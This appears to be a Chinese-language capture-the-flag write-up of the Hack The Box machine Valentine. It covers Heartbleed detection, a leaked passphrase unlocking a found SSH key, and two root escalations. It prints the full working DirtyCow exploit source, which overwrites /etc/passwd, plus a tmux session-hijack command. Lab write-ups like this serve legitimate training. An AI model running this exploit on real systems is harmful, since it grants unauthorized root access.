---
title: Valentine
date: 2021-12-24 11:35:06
tags: Hack The Box
categoreies: 心脏滴血
---

## 靶机信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 信息收集

可以看到主机开放了web服务和ssh服务，这里发现了`valentine.htb`这个子域，我们可以将它对应的解析地址添加到hosts文件中去
![在这里插入图片描述](https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问其web服务的时候，就只有一张图片，查看代码源码啥的都没有，但是这张图片的心脏在滴血，我们不难猜到是心脏滴血漏洞吧
![在这里插入图片描述](https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们想用脚本检测一下是否存在心脏滴血漏洞，这里有两种方法检测这个漏洞，一种是使用`heartbleed.py`这个python脚本，另一种是使用nmap自带的nse脚本检测
![在这里插入图片描述](https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们发现了一段base64的加密信息`$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`，解码发现明文是`heartbleedbelievethehype`，不知道是什么，先留着或许后面有用。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
目前来说没啥可利用的信息了，我们进行扫一波目录吧。发现了三个可访问的目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
dev目录下，我们发现了一个`hype_key`和`notes.txt`这两个文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16)
打开hype_key发现是一堆十六进制的字符，我们解码之后发现是一个私钥
![在这里插入图片描述](https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们发现之前不是有一个类似密码的字符串的吗。我们尝试登陆，并且成功了，我们可以查看到user.txt文件内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png)

## 提权

这里我们开启一个服务器，上传`linpeas.sh`这个脚本到目标机器上，这个脚本功能非常强大，是专门针对Linux提权的一个脚本工具。它是由Carlos P创建的，目的是列举在Linux系统上提升特权的所有可能方法。
![在这里插入图片描述](https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
赋予执行权限并运行这个脚本，这里有两种提权的方法，一种是脏牛提权，这个简单快捷；另一种利用`tmux`这个应用程序来实施提权。

### 脏牛提权

这里我们发现这个Linux版本较低，那么我们可以使用脏牛进行提权
![在这里插入图片描述](https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在`exploit-db`上可以发现利用的脚本
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这是整个脚本的内容

```c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```

我们将脏牛脚本下载到目标机器上
![在这里插入图片描述](https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后编译并运行这个脚本，新设置的密码为空

```bash
gcc -pthread 40389.c -o dirty -lcrypt
./dirty
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## tmux提权

除了脏牛，我们还发现以root用户运行的tmux程序
![在这里插入图片描述](https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png)
那么我们直接运行命令，就能够提权到root上了

```bash
/usr/bin/tmux -S /.devs/dev_sess
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png)
